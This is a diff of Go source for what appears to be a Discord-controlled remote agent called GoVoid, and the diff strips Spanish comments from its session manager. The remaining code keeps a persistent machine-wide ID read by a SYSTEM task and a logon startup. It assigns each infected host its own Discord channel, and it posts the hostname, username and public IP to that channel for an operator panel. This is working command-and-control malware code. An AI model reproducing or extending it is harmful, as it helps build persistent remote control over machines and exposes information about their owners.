@@ -23,7 +23,6 @@ import (
 	"github.com/local/govoid/internal/util"
 )
 
-// Session describe la instancia del agente y su canal C2.
 type Session struct {
 	ID          string
 	ChannelID   string
@@ -35,7 +34,6 @@ type Session struct {
 }
 
 var (
-	// CurrentSession es el singleton de esta instancia del agente.
 	CurrentSession *Session
 	sessionMu      sync.RWMutex
 	instanceID     = loadOrCreateInstanceID()
@@ -49,16 +47,10 @@ func newInstanceID() string {
 	return hex.EncodeToString(buf)
 }
 
-// instanceIDPath es donde vive el identificador de esta instalación. En
-// %ProgramData%\GoVoid, machine-wide: la tarea SYSTEM y el arranque por logon
-// tienen que leer el mismo archivo, o cada uno se inventa un identificador y
-// acaba en un canal distinto.
 func instanceIDPath() string {
 	return filepath.Join(config.StateDir(), "instance.id")
 }
 
-// legacyInstanceIDPath es la ruta anterior, bajo %APPDATA%. Se lee una vez para
-// no cambiarle el canal a una instalación que ya estaba en marcha.
 func legacyInstanceIDPath() string {
 	dir, err := os.UserConfigDir()
 	if err != nil || dir == "" {
@@ -67,9 +59,6 @@ func legacyInstanceIDPath() string {
 	return filepath.Join(dir, config.DataDirName, "instance.id")
 }
 
-// loadOrCreateInstanceID devuelve el mismo ID en cada arranque. Antes se
-// generaba uno nuevo por proceso y cada reinicio creaba otro canal; con el ID
-// en disco el agente vuelve siempre a su sesión.
 func loadOrCreateInstanceID() string {
 	path := instanceIDPath()
 	if path != "" {
@@ -83,9 +72,6 @@ func loadOrCreateInstanceID() string {
 		}
 	}
 
-	// Migración: una instalación que venía usando %APPDATA% conserva su
-	// identificador —y por tanto su canal— la primera vez que arranca con la
-	// ruta machine-wide.
 	if legacy := legacyInstanceIDPath(); legacy != "" {
 		if raw, err := os.ReadFile(legacy); err == nil {
 			id := strings.TrimSpace(string(raw))
@@ -111,9 +97,6 @@ func loadOrCreateInstanceID() string {
 	return id
 }
 
-// topicMatchesInstance indica si un canal pertenece a esta instalación. Se
-// acepta coincidencia por ID o, para canales viejos sin ID persistente, por
-// hostname + usuario, que es lo único estable que llevan en el topic.
 func topicMatchesInstance(topic, hostname, username string) bool {
 	if topic == "" {
 		return false
@@ -128,9 +111,6 @@ func topicMatchesInstance(topic, hostname, username string) bool {
 	return strings.TrimSpace(parts[0]) == hostname && strings.TrimSpace(parts[1]) == username
 }
 
-// guildChannelsBounded acota el listado de canales. Discord no siempre responde
-// a esa petición con el gateway recién abierto y sin tope el agente se queda
-// colgado antes de llegar a "conectado".
 func guildChannelsBounded(s *discordgo.Session, limit time.Duration) ([]*discordgo.Channel, error) {
 	type result struct {
 		channels []*discordgo.Channel
@@ -154,10 +134,6 @@ func guildChannelsBounded(s *discordgo.Session, limit time.Duration) ([]*discord
 	}
 }
 
-// channelEditBounded y channelCreateBounded acotan las dos llamadas REST que
-// pueden quedarse esperando un bucket de Discord agotado. Sin tope, el agente
-// abría el gateway y se quedaba mudo: ni panel, ni sesión, ni error en el
-// diario. Con tope, el fallo se convierte en un reintento visible.
 func channelEditBounded(s *discordgo.Session, id string, edit *discordgo.ChannelEdit, limit time.Duration) (*discordgo.Channel, error) {
 	type result struct {
 		channel *discordgo.Channel
@@ -218,17 +194,12 @@ func currentSession() *Session {
 	return CurrentSession
 }
 
-// snapshotSession copia la sesión bajo el mutex. La IP y la hora de conexión
-// cambian en segundo plano mientras el panel se envía; leer los campos sueltos
-// deja el panel con "desconocida" o dispara el detector de carreras.
 func snapshotSession(session *Session) Session {
 	sessionMu.RLock()
 	defer sessionMu.RUnlock()
 	return *session
 }
 
-// ensureSession reutiliza el canal de esta instancia si ya existe o crea
-// sesion-<N> con el siguiente número libre.
 func ensureSession(s *discordgo.Session) (*Session, error) {
 	sessionMu.Lock()
 	defer sessionMu.Unlock()
@@ -247,10 +218,6 @@ func ensureSession(s *discordgo.Session) (*Session, error) {
 		username = current.Username
 	}
 
-	// Canal en caché: el arranque no depende de listar el gremio por REST.
-	// GuildChannels se quedó colgado 74 s tras un reinicio y el agente nunca
-	// llegó a marcar "conectado"; con el ID en disco la sesión es inmediata y
-	// la verificación ocurre después, en segundo plano.
 	if cachedID, cachedNum := cachedChannel(); cachedID != "" {
 		session := &Session{
 			ID:          instanceID,
@@ -269,10 +236,6 @@ func ensureSession(s *discordgo.Session) (*Session, error) {
 		return session, nil
 	}
 
-	// GuildChannels puede quedarse colgado con el gateway recién abierto: la
-	// petición REST entra en un bucket que no responde y el agente se queda
-	// antes de marcar "conectado". Con tope, el fallo se convierte en un
-	// reintento del bucle de reconexión en vez de un bot muerto.
 	channels, err := guildChannelsBounded(s, 20*time.Second)
 	if err != nil {
 		return nil, fmt.Errorf("sessionmgr: no se pudieron listar canales: %w", err)
@@ -313,11 +276,6 @@ func ensureSession(s *discordgo.Session) (*Session, error) {
 		CurrentSession = session
 		commands.SetSessionInfo(session.ID, session.SessionNum, session.ChannelID, session.Hostname, session.Username)
 
-		// Refresca el topic con el ID actual: así el próximo arranque reconoce
-		// el canal por ID y no por hostname. Va en segundo plano: la edición de
-		// topic comparte el bucket de canales y, con dos ediciones seguidas,
-		// Discord responde 429 y la llamada se queda esperando. Bloquear aquí
-		// retrasaba el panel hasta 20 s —el operador veía "conectado" sin panel.
 		topic := fmt.Sprintf("%s | %s | %s | %s | conectado %s",
 			hostname, username, publicIP, instanceID, time.Now().UTC().Format(time.RFC3339))
 		go func(channelID, topic string) {
